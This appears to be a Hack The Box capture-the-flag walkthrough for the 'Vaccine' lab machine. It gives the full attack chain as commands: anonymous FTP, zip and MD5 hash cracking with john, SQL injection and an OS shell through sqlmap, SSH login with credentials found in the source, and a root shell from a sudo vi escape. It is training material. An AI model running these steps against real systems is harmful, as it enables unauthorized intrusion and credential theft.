# Hack The Box — Vaccine Walkthrough

## Overview
This machine was solved using SQL Injection to gain database access, extract credentials, then pivoting to SSH and abusing a misconfigured sudo rule to gain root access.

> **Note:** Target IP addresses are replaced with `TARGET_IP`.

---

## 1. Initial Enumeration

### Port Scanning
```
nmap -sC -sV TARGET_IP
```

Open ports found:
- 21 (FTP)
- 22 (SSH)
- 80 (HTTP)

---

## 2. FTP Enumeration

Anonymous FTP login was allowed:
```
ftp TARGET_IP
Name: anonymous
Password: (empty)
```

Downloaded file:
- `backup.zip`

---

## 3. Cracking ZIP Password

### Extract ZIP hash
```
zip2john backup.zip > zip.hash
```

### Crack with John
```
john zip.hash
```

### Extract ZIP
```
unzip backup.zip
```

---

## 4. Web Application Analysis

Inside the extracted source code (`index.php`) the following was found:
```php
md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3"
```

### Crack MD5 hash
```
john --format=raw-md5 md5.txt
```

Admin credentials were obtained and used to log in.

---

## 5. SQL Injection Discovery

Tested input:
```
search='
```

Application returned an error → SQL Injection confirmed.

---

## 6. SQL Injection Exploitation (sqlmap)

### Capture request → `req.txt`

### Run sqlmap
```
sqlmap -r req.txt
```

Backend DBMS:
- PostgreSQL

### Enumerate databases
```
sqlmap -r req.txt --dbs
```

### Enumerate tables
```
sqlmap -r req.txt -D public --tables
```

### Dump table
```
sqlmap -r req.txt -D public -T cars --dump
```

---

## 7. OS Shell (Limited)

```
sqlmap -r req.txt --os-shell
```

- Shell obtained
- No proper TTY
- sudo not usable from sqlmap shell

---

## 8. Credential Discovery

Found in `dashboard.php`:
```
user=postgres
password=P@s5w0rd!
```

---

## 9. SSH Access

```
ssh postgres@TARGET_IP
```

---

## 10. Privilege Escalation

Check sudo permissions:
```
sudo -l
```

Allowed command:
```
(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

---

## 11. Root via vi

```
sudo vi /etc/postgresql/11/main/pg_hba.conf
```

Inside vi:
```
:set shell=/bin/bash
:shell
```

Root shell obtained.

---

## 12. Flags

User flag:
```
/home/postgres/user.txt
```

Root flag:
```
/root/root.txt
```

---

## Summary

- Anonymous FTP → backup.zip
- ZIP password cracked
- MD5 password cracked
- SQL Injection exploited
- Credentials extracted
- SSH access as postgres
- Sudo misconfiguration with vi
- Root access achieved
